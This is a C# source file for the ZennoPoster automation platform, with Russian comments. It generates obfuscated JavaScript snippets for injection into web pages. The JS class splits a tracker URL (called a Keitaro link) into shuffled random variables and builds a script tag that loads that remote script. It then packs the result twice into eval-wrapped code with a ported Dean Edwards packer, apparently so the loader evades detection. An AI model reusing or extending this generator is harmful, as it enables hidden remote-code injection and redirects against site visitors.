using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.IO;
using System.Text.RegularExpressions;
using ZennoLab.CommandCenter;
using ZennoLab.InterfacesLibrary;
using ZennoLab.InterfacesLibrary.ProjectModel;
using ZennoLab.InterfacesLibrary.ProjectModel.Collections;
using ZennoLab.InterfacesLibrary.ProjectModel.Enums;
using ZennoLab.Macros;
using Global.ZennoExtensions;
using ZennoLab.Emulation;

using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Web;

namespace ZennoLab.OwnCode {
	public class CommonCode {
		public static object SyncObject = new object();
		
		public static string Start (string url){
			string js = JS.CRIPTED_URL(url).Trim();
			return string.Format(@"<script>{0}</script>",js);
		}
	}
	
	#region Потокобезопасный генератор случайных чисел
     public sealed class GoodRandom : Random {
       private static int seed() { return Guid.NewGuid().ToString().GetHashCode(); }
         private ThreadLocal<Random> rand = new ThreadLocal<Random>(() => new Random(seed()));
 
         public override int Next() { return rand.Value.Next(); }
         public override int Next(int maxValue) { return rand.Value.Next(maxValue); }
         public override int Next(int minValue, int maxValue) { return rand.Value.Next(minValue, maxValue); }
         public override double NextDouble() { return rand.Value.NextDouble(); }
         public override void NextBytes(byte[] buffer) { rand.Value.NextBytes(buffer); }        
    }
  #endregion
	#region Класс создание редиректа
    public class JS {
        /// <summary>
        /// Генерирует редирект по ссылке
        /// </summary>
        /// <param name="url">Ссылка на кейтаро</param>
        /// <returns>Готовый код, который нужно вставить в тег скрипт</returns>
        public static string HTML(string url) {
            return string.IsNullOrEmpty(url) ? string.Empty : html_final(url);
        }

        public static string CRIPTED_JS(string js) {
            if (string.IsNullOrEmpty(js)) return string.Empty;
            string html = string.Empty;
            ECMAScriptPacker p = new ECMAScriptPacker(ECMAScriptPacker.PackerEncoding.Normal, true, false);
            html = p.Pack(js).Replace("\n", "\r\n");
            p = new ECMAScriptPacker(ECMAScriptPacker.PackerEncoding.Numeric, true, false);
            html = p.Pack(html).Replace("\n", "\r\n");
            p = null;
            return html;
        }
        public static string CRIPTED_URL(string url) {
            if (string.IsNullOrEmpty(url)) return string.Empty;
            string js = HTML(url);
            string html = string.Empty;
            ECMAScriptPacker p = new ECMAScriptPacker(ECMAScriptPacker.PackerEncoding.Normal, true, false);
            html = p.Pack(js).Replace("\n", "\r\n");
            p = new ECMAScriptPacker(ECMAScriptPacker.PackerEncoding.Numeric, true, false);
            html = p.Pack(html).Replace("\n", "\r\n");
            p = null;
            return html;
        }

        #region Случайная строка
        private static string[] RandomString()
        {
            GoodRandom rand = new GoodRandom();
            const string symb = "a b c d e f g h i j k l m n o p q r s t u v w x y z";
            string[] arr = symb.Split(' ');
            string[] tarr = arr.Reverse().ToArray();

            List<string> temp = new List<string>();
            foreach (string a in arr)
            {
                int max_i = rand.Next(5, 10);
                for (int i = 0; i <= max_i; i++)
                {
                    temp.AddRange(tarr.OrderBy(x => Guid.NewGuid().ToString()).ToList().Select(b => a + b + a));
                }
            }
            List<string> rezult = new List<string>();
            rezult.AddRange(arr.OrderBy(x => Guid.NewGuid().ToString()).ToList());
            rezult.AddRange(temp);
            rezult = new List<string>(rezult.Distinct());
            return rezult.ToArray();
        }
        #endregion
        #region Таблица соответствий
        private static IEnumerable<string[]> aword(string word, string[] rarr)
        {
            char[] chars = word.ToCharArray();
            return chars.Select((t, i) => new[] { rarr[i], t.ToString() }).ToArray();
        }
        #endregion
        #region Генерируем скрипт
        private static string html_final(string url_word)
        {
            IEnumerable<string[]> url = aword(url_word, RandomString());

            List<string> por = new List<string>();
            List<string> res = new List<string>();

            foreach (string[] s in url)
            {
                res.Add(string.Format(@"var {0} ='{1}'; ", s[0], s[1]));
                por.Add(s[0]);
            }
            res = res.OrderBy(x => Guid.NewGuid().ToString()).ToList();

            string html = string.Empty;
            html += " ";
            html += string.Format(@"{0}", string.Join(string.Empty, res));

            string surl = por.Aggregate(string.Empty, (current, s) => current + string.Format(@" {0} +", s));

            const string origin = "abcdefghijklmnopqrstuvwxyz";
            string mvar = Shuffle.Mix(origin, 5);
            string mscr = Shuffle.Mix(origin, 7);
            //Trace.WriteLine("mscr: " + mscr);

            html += string.Format(@" var {0} = {1}document.title.split("" "").slice(0,-1).slice(0,-1).join("" "");  ", mscr, surl);
            html += string.Format(@" var {0} = document.createElement('script'); {0}.setAttribute('src', {1}); document.head.appendChild({0}); ", mvar, mscr);
            return html;
        }
        #endregion
    }
    #endregion	
    #region Класс перемешивания
    public class Shuffle {
        /// <summary>
        /// Перемешивает строку и обрезает до нужного размера
        /// В случае если передается пустая строка или 1 символ - он просто возвращается с метода
        /// Если не передавать размер для обрезания - строка не будет обрезана
        /// </summary>
        /// <param name="text">Строка которую нужно перемешать</param>
        /// <param name="cut_string">Размер до которого нужно обрезать строку</param>
        /// <returns>Возвращает перемешанную обрезанную строку</returns>
        public static string Mix(string text, int cut_string) {
            if (string.IsNullOrEmpty(text)) return string.Empty;
            if (text.Length <= 1) return text;
            return StringMixer(text, cut_string);
        }

        public static string Mix(string text) {
            if (string.IsNullOrEmpty(text)) return string.Empty;
            if (text.Length <= 1) return text;
            return StringMixer(text, int.MaxValue);
        }

        #region Перемешиваем массив
		/// <summary>
		/// Перемешиваем массив
		/// </summary>
		/// <param name="array"></param>
		/// <returns></returns>
        private static int[] Fisher_Yates(int[] array) {
            GoodRandom rand = new GoodRandom();
            int sizeArr = array.Length;
            int random = 0;
            int temp = 0;
            for (int i = 0; i < sizeArr; i++) {
                random = i + (int)(rand.NextDouble() * (sizeArr - i));
                temp = array[random];
                array[random] = array[i];
                array[i] = temp;
            }
            return array;
        }
        #endregion

        #region Перемешиваем строку и обрезаем до нужного размера
		/// <summary>
		/// Перемешиваем строку и обрезаем до нужного размера
		/// </summary>
		/// <param name="s"></param>
		/// <param name="size"></param>
		/// <returns></returns>
        private static string StringMixer(string s, int size) {
            string output = string.Empty;
            int sizeArr = s.Length;
            int[] randArr = new int[sizeArr];
            for (int i = 0; i < sizeArr; i++) randArr[i] = i;

            randArr = Fisher_Yates(randArr);
            for (int i = 0; i < sizeArr; i++) output += s[randArr[i]];

            return size < output.Length ? output.Remove(size) : output;
        }
        #endregion
    }

    #endregion	
	#region ECMAScriptPacker
	/*
	    packer, version 2.0 (beta) (2005/02/01)
	    Copyright 2004-2005, Dean Edwards
	    Web: http://dean.edwards.name/
	    This software is licensed under the CC-GNU LGPL
	    Web: http://creativecommons.org/licenses/LGPL/2.1/
	    
	    Ported to C# by Jesse Hansen, twindagger2k@msn.com
	*/
	// http://dean.edwards.name/packer/
    public class ECMAScriptPacker : IHttpHandler {		

		
        /// <summary>
        /// Уровень кодирования для использования. См. Http://dean.edwards.name/packer/usage/ для получения дополнительной информации.
        /// </summary>
        public enum PackerEncoding { None = 0, Numeric = 10, Mid = 36, Normal = 62, HighAscii = 95 };
        private PackerEncoding encoding = PackerEncoding.Normal;
        private bool fastDecode = true;
        private bool specialChars = false;
        private bool enabled = true;

        string IGNORE = "$1";

        /// <summary>
        /// Уровень кодирования для этого экземпляра
        /// </summary>
        public PackerEncoding Encoding {
            get { return encoding; }
            set { encoding = value; }
        }

        /// <summary>
        /// Добавляет подпрограмму к выходу для ускорения декодирования
        /// </summary>
        public bool FastDecode {
            get { return fastDecode; }
            set { fastDecode = value; }
        }

        /// <summary>
        /// Заменяет специальные символы
        /// </summary>
        public bool SpecialChars {
            get { return specialChars; }
            set { specialChars = value; }
        }

        /// <summary>
        /// Упаковщик включен
        /// </summary>
        public bool Enabled {
            get { return enabled; }
            set { enabled = value; }
        }

        public ECMAScriptPacker() {
            Encoding = PackerEncoding.Normal;
            FastDecode = true;
            SpecialChars = false;
        }

        /// <summary>
        /// Конструктор
        /// </summary>
        /// <param name="encoding">Уровень кодирования для этого экземпляра</param>
        /// <param name="fastDecode">Добавляет подпрограмму к выходу для ускорения декодирования</param>
        /// <param name="specialChars">Заменяет специальные символы</param>
        public ECMAScriptPacker(PackerEncoding encoding, bool fastDecode, bool specialChars) {
            Encoding = encoding;
            FastDecode = fastDecode;
            SpecialChars = specialChars;
        }

        /// <summary>
        /// Упаковывает скрипт
        /// </summary>
        /// <param name="script">скрипт для упаковки</param>
        /// <returns>упакованный скрипт</returns>
        public string Pack(string script) {
            if (enabled) {
                script += "\n";
                script = basicCompression(script);
                if (SpecialChars) script = encodeSpecialChars(script);
                if (Encoding != PackerEncoding.None) script = encodeKeywords(script);
            }
            return script;
        }

        // нулевое кодирование - просто удаление пробелов и комментариев
        private string basicCompression(string script) {
            ParseMaster parser = new ParseMaster();
            parser.EscapeChar = '\\'; // сделать безопасным           
            parser.Add("'[^'\\n\\r]*'", IGNORE); // защитить строки
            parser.Add("\"[^\"\\n\\r]*\"", IGNORE);
            parser.Add("\\/\\/[^\\n\\r]*[\\n\\r]"); // удалить комментарии
            parser.Add("\\/\\*[^*]*\\*+([^\\/][^*]*\\*+)*\\/");
            parser.Add("\\s+(\\/[^\\/\\n\\r\\*][^\\/\\n\\r]*\\/g?i?)", "$2"); // защитить регулярные выражения
            parser.Add("[^\\w\\$\\/'\"*)\\?:]\\/[^\\/\\n\\r\\*][^\\/\\n\\r]*\\/g?i?", IGNORE);
            // Удалить: ;;; сделай что-нибудь();
            if (specialChars) {
                parser.Add(";;[^\\n\\r]+[\\n\\r]");
            }

            parser.Add(";+\\s*([};])", "$2"); // удалить лишние точки с запятой
            parser.Add("(\\b|\\$)\\s+(\\b|\\$)", "$2 $3");  // удалить пробел
            parser.Add("([+\\-])\\s+([+\\-])", "$2 $3");
            parser.Add("\\s+");
            return parser.Exec(script); // сделанный
        }

        WordList encodingLookup;
        private string encodeSpecialChars(string script) {
            ParseMaster parser = new ParseMaster();
            parser.Add("((\\$+)([a-zA-Z\\$_]+))(\\d*)", new ParseMaster.MatchGroupEvaluator(encodeLocalVars));  // replace: $name -> n, $$name -> na
            Regex regex = new Regex("\\b_[A-Za-z\\d]\\w*");// replace: _name -> _0, double-underscore (__name) is ignored
            encodingLookup = analyze(script, regex, new EncodeMethod(encodePrivate)); // build the word list
            parser.Add("\\b_[A-Za-z\\d]\\w*", new ParseMaster.MatchGroupEvaluator(encodeWithLookup));
            script = parser.Exec(script);
            return script;
        }

        private string encodeKeywords(string script) {
            if (Encoding == PackerEncoding.HighAscii) script = escape95(script); // escape high-ascii values already in the script (i.e. in strings)

            ParseMaster parser = new ParseMaster(); // create the parser
            EncodeMethod encode = getEncoder(Encoding);
            Regex regex = new Regex((Encoding == PackerEncoding.HighAscii) ? "\\w\\w+" : "\\w+");// for high-ascii, don't encode single character low-ascii
            encodingLookup = analyze(script, regex, encode); // build the word list          
            parser.Add((Encoding == PackerEncoding.HighAscii) ? "\\w\\w+" : "\\w+", new ParseMaster.MatchGroupEvaluator(encodeWithLookup)); // encode
            return (script == string.Empty) ? "" : bootStrap(parser.Exec(script), encodingLookup);// if encoded, wrap the script in a decoding function
        }

        private string bootStrap(string packed, WordList keywords) {
            packed = "'" + escape(packed) + "'"; // packed: the packed script	   
            int ascii = Math.Min(keywords.Sorted.Count, (int)Encoding); // ascii: base for encoding
            if (ascii == 0) ascii = 1;
            int count = keywords.Sorted.Count; // count: number of words contained in the script		   
            foreach (object key in keywords.Protected.Keys) keywords.Sorted[(int)key] = ""; // keywords: list of words contained in the script
            StringBuilder sbKeywords = new StringBuilder("'");
            foreach (string word in keywords.Sorted) sbKeywords.Append(word + "|");  // convert from a string to an array
            sbKeywords.Remove(sbKeywords.Length - 1, 1);
            string keywordsout = sbKeywords.ToString() + "'.split('|')";

            string encode;
            string inline = "c";

            switch (Encoding) {
                case PackerEncoding.Mid:
                    encode = "function(c){return c.toString(36)}";
                    inline += ".toString(a)";
                    break;
                case PackerEncoding.Normal:
                    encode = "function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))}";
                    inline += ".toString(a)";
                    break;
                case PackerEncoding.HighAscii:
                    encode = "function(c){return(c<a?\"\":e(c/a))+String.fromCharCode(c%a+161)}";
                    inline += ".toString(a)";
                    break;
                default:
                    encode = "function(c){return c}";
                    break;
            }


            string decode = ""; // decode: code snippet to speed up decoding
            if (fastDecode) {
                decode = "if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1;}";
                if (Encoding == PackerEncoding.HighAscii) decode = decode.Replace("\\\\w", "[\\xa1-\\xff]");
                else if (Encoding == PackerEncoding.Numeric) decode = decode.Replace("e(c)", inline);
                if (count == 0) decode = decode.Replace("c=1", "c=0");
            }


            string unpack = "function(p,a,c,k,e,d){while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p;}"; // boot function
            Regex r;
            if (fastDecode) {
                r = new Regex("\\{"); //insert the decoder
                unpack = r.Replace(unpack, "{" + decode + ";", 1);
            }

            if (Encoding == PackerEncoding.HighAscii) {
                r = new Regex("'\\\\\\\\b'\\s*\\+|\\+\\s*'\\\\\\\\b'"); // get rid of the word-boundries for regexp matches
                unpack = r.Replace(unpack, "");
            }
            if (Encoding == PackerEncoding.HighAscii || ascii > (int)PackerEncoding.Normal || fastDecode) {
				r = new Regex("\\{"); // insert the encode function
                unpack = r.Replace(unpack, "{e=" + encode + ";", 1);
            }
            else {
                r = new Regex("e\\(c\\)");
                unpack = r.Replace(unpack, inline);
            }
            string _params = "" + packed + "," + ascii + "," + count + "," + keywordsout; // no need to pack the boot function since i've already done it
            if (fastDecode) {
                _params += ",0,{}"; //insert placeholders for the decoder
            }
            return "eval(" + unpack + "(" + _params + "))\n"; // the whole thing
        }

        private string escape(string input) {
            Regex r = new Regex("([\\\\'])");
            return r.Replace(input, "\\$1");
        }

        private EncodeMethod getEncoder(PackerEncoding encoding) {
            switch (encoding) {
                case PackerEncoding.Mid:
                    return new EncodeMethod(encode36);
                case PackerEncoding.Normal:
                    return new EncodeMethod(encode62);
                case PackerEncoding.HighAscii:
                    return new EncodeMethod(encode95);
                default:
                    return new EncodeMethod(encode10);
            }
        }

        private string encode10(int code) {
            return code.ToString();
        }

        private static string lookup36 = "0123456789abcdefghijklmnopqrstuvwxyz";

        private string encode36(int code) {
            string encoded = "";
            int i = 0;
            do {
                int digit = (code / (int)Math.Pow(36, i)) % 36;
                encoded = lookup36[digit] + encoded;
                code -= digit * (int)Math.Pow(36, i++);
            }
            while (code > 0);
            return encoded;
        }

        private static string lookup62 = lookup36 + "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

        private string encode62(int code) {
            string encoded = "";
            int i = 0;
            do {
                int digit = (code / (int)Math.Pow(62, i)) % 62;
                encoded = lookup62[digit] + encoded;
                code -= digit * (int)Math.Pow(62, i++);
            }
            while (code > 0);
            return encoded;
        }

        private static string lookup95 = "ЎўЈ¤Ґ¦§Ё©Є«¬­®Ї°±Ііґµ¶·ё№є»јЅѕїАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя";

        private string encode95(int code) {
            string encoded = "";
            int i = 0;
            do {
                int digit = (code / (int)Math.Pow(95, i)) % 95;
                encoded = lookup95[digit] + encoded;
                code -= digit * (int)Math.Pow(95, i++);
            }
            while (code > 0);
            return encoded;
        }

        private string escape95(string input) {
            Regex r = new Regex("[\xa1-\xff]");
            return r.Replace(input, new MatchEvaluator(escape95Eval));
        }

        private string escape95Eval(Match match) {
            return "\\x" + ((int)match.Value[0]).ToString("x"); //return hexadecimal value
        }

        private string encodeLocalVars(Match match, int offset) {
            int length = match.Groups[offset + 2].Length;
            int start = length - Math.Max(length - match.Groups[offset + 3].Length, 0);
            return match.Groups[offset + 1].Value.Substring(start, length) + match.Groups[offset + 4].Value;
        }

        private string encodeWithLookup(Match match, int offset) {
            return (string)encodingLookup.Encoded[match.Groups[offset].Value];
        }

        private delegate string EncodeMethod(int code);

        private string encodePrivate(int code) {
            return "_" + code;
        }

        private WordList analyze(string input, Regex regex, EncodeMethod encodeMethod) {
            MatchCollection all = regex.Matches(input);
            WordList rtrn;
            rtrn.Sorted = new StringCollection(); // list of words sorted by frequency
            rtrn.Protected = new HybridDictionary(); // dictionary of word->encoding
            rtrn.Encoded = new HybridDictionary(); // instances of "protected" words
            if (all.Count > 0) {
                StringCollection unsorted = new StringCollection(); // same list, not sorted
                HybridDictionary Protected = new HybridDictionary(); // "protected" words (dictionary of word->"word")
                HybridDictionary values = new HybridDictionary(); // dictionary of charCode->encoding (eg. 256->ff)
                HybridDictionary count = new HybridDictionary(); // word->count
                int i = all.Count, j = 0;
                string word;
                do {
                    word = "$" + all[--i].Value;
                    if (count[word] == null) {
                        count[word] = 0;
                        unsorted.Add(word);
                        Protected["$" + (values[j] = encodeMethod(j))] = j++;
                    }
                    count[word] = (int)count[word] + 1;
                } while (i > 0);

				i = unsorted.Count;
                string[] sortedarr = new string[unsorted.Count];
                do {
                    word = unsorted[--i];
                    if (Protected[word] != null) {
                        sortedarr[(int)Protected[word]] = word.Substring(1);
                        rtrn.Protected[(int)Protected[word]] = true;
                        count[word] = 0;
                    }
                } while (i > 0);
                string[] unsortedarr = new string[unsorted.Count];
                unsorted.CopyTo(unsortedarr, 0);
                Array.Sort(unsortedarr, (IComparer)new CountComparer(count));
                j = 0;

                do {
                    if (sortedarr[i] == null) sortedarr[i] = unsortedarr[j++].Substring(1);
                    rtrn.Encoded[sortedarr[i]] = values[i];
                } 
				while (++i < unsortedarr.Length);
                rtrn.Sorted.AddRange(sortedarr);
            }
            return rtrn;
        }

        private struct WordList {
            public StringCollection Sorted;
            public HybridDictionary Encoded;
            public HybridDictionary Protected;
        }

        private class CountComparer : IComparer {
            HybridDictionary count;

            public CountComparer(HybridDictionary count) {
                this.count = count;
            }
            public int Compare(object x, object y) {
                return (int)count[y] - (int)count[x];
            }
        }
        public void ProcessRequest(HttpContext context) {
            if (context.Request.QueryString["Encoding"] != null) {
                switch (context.Request.QueryString["Encoding"].ToLower()) {
                    case "none": Encoding = PackerEncoding.None;
                        break;
                    case "numeric": Encoding = PackerEncoding.Numeric;
                        break;
                    case "mid": Encoding = PackerEncoding.Mid;
                        break;
                    case "normal": Encoding = PackerEncoding.Normal;
                        break;
                    case "highascii":
                    case "high":
                        Encoding = PackerEncoding.HighAscii;
                        break;
                }
            }
            if (context.Request.QueryString["FastDecode"] != null) {
                if (context.Request.QueryString["FastDecode"].ToLower() == "true") FastDecode = true;
                else FastDecode = false;
            }
            if (context.Request.QueryString["SpecialChars"] != null) {
                if (context.Request.QueryString["SpecialChars"].ToLower() == "true") SpecialChars = true;
                else SpecialChars = false;
            }
            if (context.Request.QueryString["Enabled"] != null) {
                if (context.Request.QueryString["Enabled"].ToLower() == "true") Enabled = true;
                else Enabled = false;
            }
            //handle the request
            TextReader r = new StreamReader(context.Request.PhysicalPath);
            string jscontent = r.ReadToEnd();
            r.Close();
            context.Response.ContentType = "text/javascript";
            context.Response.Output.Write(Pack(jscontent));
        }

        public bool IsReusable {
            get {
                return false;
            }
        }
    }
	#endregion
	#region ParseMaster
    public class ParseMaster {
        // используется для определения уровней вложенности
        Regex GROUPS = new Regex("\\("),
        SUB_REPLACE = new Regex("\\$"),
        INDEXED = new Regex("^\\$\\d+$"),
        ESCAPE = new Regex("\\\\."),
        QUOTE = new Regex("'"),
        DELETED = new Regex("\\x01[^\\x01]*\\x01");


        /// <summary>
        /// Делегат для вызова, когда найдено регулярное выражение.
        /// Использовать match.Groups [offset + & lt; номер группы & gt;]. Значение, чтобы получить
        /// правильное подвыражение
        /// </ summary>
        public delegate string MatchGroupEvaluator(Match match, int offset);

        private string DELETE(Match match, int offset) {
            return "\x01" + match.Groups[offset].Value + "\x01";
        }

        private bool ignoreCase = false;
        private char escapeChar = '\0';

        /// <summary>
        /// Ignore Case?
        /// </summary>
        public bool IgnoreCase {
            get { return ignoreCase; }
            set { ignoreCase = value; }
        }

        /// <summary>
        /// Escape Character to use
        /// </summary>
        public char EscapeChar {
            get { return escapeChar; }
            set { escapeChar = value; }
        }

        /// <summary>
        /// Add an expression to be deleted
        /// </summary>
        /// <param name="expression">Regular Expression String</param>
        public void Add(string expression) {
            Add(expression, string.Empty);
        }

        /// <summary>
        /// Добавить выражение для замены строкой замены
        /// </ summary>
        /// <param name = "expression"> Строка регулярного выражения </ param>
        /// <param name = "replace"> Строка замены. Используйте $ 1, $ 2 и т. Д. Для групп </ param>
        public void Add(string expression, string replacement) {
            if (replacement == string.Empty) add(expression, new MatchGroupEvaluator(DELETE));
            add(expression, replacement);
        }

        /// <summary>
        /// Добавить выражение для замены с помощью функции обратного вызова
        /// </ summary>
        /// <param name = "expression"> Строка регулярного выражения </ param>
        /// <param name = "replace"> функция обратного вызова </ param>
        public void Add(string expression, MatchGroupEvaluator replacement) {
            add(expression, replacement);
        }

        /// <summary>
        /// Выполняет парсер
        /// </ summary>
        /// <param name = "input"> строка ввода </ param>
        /// <return> разобранная строка </ Return>
        public string Exec(string input) {
            return DELETED.Replace(unescape(getPatterns().Replace(escape(input), new MatchEvaluator(replacement))), string.Empty);
        }

        ArrayList patterns = new ArrayList();
        private void add(string expression, object replacement) {
            Pattern pattern = new Pattern();
            pattern.expression = expression;
            pattern.replacement = replacement;
            // подсчитать количество подвыражений
            // - добавить 1, потому что каждая группа сама является подвыражением
            pattern.length = GROUPS.Matches(internalEscape(expression)).Count + 1;

            // шаблон имеет дело с sup-выражениями?
            if (replacement is string && SUB_REPLACE.IsMatch((string)replacement)) {
                string sreplacement = (string)replacement;
                // простой поиск (например, $ 2)
                if (INDEXED.IsMatch(sreplacement)) {
                    pattern.replacement = int.Parse(sreplacement.Substring(1)) - 1;
                }
            }
            patterns.Add(pattern);
        }

        /// <summary>
        /// строит шаблоны в одном регулярном выражении
        /// </ summary>
        /// <Return> </ Return>
        private Regex getPatterns(){
            StringBuilder rtrn = new StringBuilder(string.Empty);
            foreach (object pattern in patterns) rtrn.Append(((Pattern)pattern).ToString() + "|");
            rtrn.Remove(rtrn.Length - 1, 1);
            return new Regex(rtrn.ToString(), ignoreCase ? RegexOptions.IgnoreCase : RegexOptions.None);
        }

        /// <summary>
        /// Global replacement function. Called once for each match found
        /// </summary>
        /// <param name="match">Match found</param>
        private string replacement(Match match) {
            int i = 1, j = 0;
            Pattern pattern;           
            while (!((pattern = (Pattern)patterns[j++]) == null)) { //loop through the patterns
                if (match.Groups[i].Value != string.Empty) {
                    object replacement = pattern.replacement;
                    if (replacement is MatchGroupEvaluator) return ((MatchGroupEvaluator)replacement)(match, i);
                    else if (replacement is int) return match.Groups[(int)replacement + i].Value;
                    else return replacementString(match, i, (string)replacement, pattern.length);
                }
                else {
                    i += pattern.length;
                }
            }
            return match.Value;
        }

        /// <summary>
        /// Replacement function for complicated lookups (e.g. Hello $3 $2)
        /// </summary>
        private string replacementString(Match match, int offset, string replacement, int length) {
            while (length > 0) {
                replacement = replacement.Replace("$" + length--, match.Groups[offset + length].Value);
            }
            return replacement;
        }

        private StringCollection escaped = new StringCollection();

        //encode escaped characters
        private string escape(string str) {
            if (escapeChar == '\0') return str;
            Regex escaping = new Regex("\\\\(.)");
            return escaping.Replace(str, new MatchEvaluator(escapeMatch));
        }

        private string escapeMatch(Match match) {
            escaped.Add(match.Groups[1].Value);
            return "\\";
        }

        //decode escaped characters
        private int unescapeIndex = 0;
        private string unescape(string str) {
            if (escapeChar == '\0') return str;
            Regex unescaping = new Regex("\\" + escapeChar);
            return unescaping.Replace(str, new MatchEvaluator(unescapeMatch));
        }

        private string unescapeMatch(Match match) {
            return "\\" + escaped[unescapeIndex++];
        }

        private string internalEscape(string str) {
            return ESCAPE.Replace(str, "");
        }

        /// <summary>
		/// subclass for each pattern
		/// </summary>
        private class Pattern {
            public string expression;
            public object replacement;
            public int length;
            public override string ToString() {
                return "(" + expression + ")";
            }
        }
    }
	#endregion
}